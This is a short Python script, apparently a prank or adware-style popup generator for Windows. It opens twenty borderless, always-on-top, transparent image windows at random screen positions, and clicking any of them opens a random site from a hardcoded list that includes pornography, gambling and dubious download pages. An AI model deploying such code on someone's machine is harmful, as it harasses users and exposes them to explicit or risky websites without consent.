import  tkinter, ctypes, random, getpass, webbrowser, _thread

class Spam():
    def __init__(self):
        self.list = list()
        self.dir = 'C:\\Users\\%s\Links\MEDIA\\' % getpass.getuser()
        for i in range(ctypes.windll.user32.GetSystemMetrics(1)):
            self.list.append(str(i))

        _thread.start_new_thread(self.main_window,())
        while True:
            pass

    def main_window(self):
        self.root = tkinter.Tk()

        self.root.configure(background='snow')
        self.root.overrideredirect(True)
        self.root.attributes("-topmost", True)
        self.root.wm_attributes("-transparentcolor", "snow")

        self.child_windows()
        self.root.mainloop()

    def child_windows(self):
        self.dict = {}
        def website(event):
            print("\a")

            urls = ['antivirus.baidu.com', 'www.hao123.com', 'softonic.com', 'www.sinthaistudio.com/alrena/',
                    'www.newsoffuture.com', 'www.bet365.com', 'www.thepornsurvey.com', '07Bux.net',
                    '80euromail.com']
            webbrowser.open(random.choice(urls))

        for i in range(20):
            self.dict[str(i)+'_img'] = tkinter.PhotoImage(file=self.dir + 'SPAM\\%s' % (str(i) + '.gif') )
            self.dict[str(i)+'_win'] = tkinter.Toplevel(self.root)
            self.dict[str(i) + '_win'].geometry('500x500+%s+%s' % (random.choice(self.list),
                                                                   random.choice(self.list)))
            self.dict[str(i) + '_win'].configure(background='snow')
            self.dict[str(i) + '_win'].overrideredirect(True)
            self.dict[str(i) + '_win'].attributes("-topmost", True)
            self.dict[str(i) + '_win'].wm_attributes("-transparentcolor", "snow")

            self.img1 = tkinter.Label(self.dict[str(i) + '_win'],
                                      background='snow',image=self.dict[str(i)+'_img'])
            self.img1.bind("<Button-1>",website)
            self.img1.pack(anchor='center')
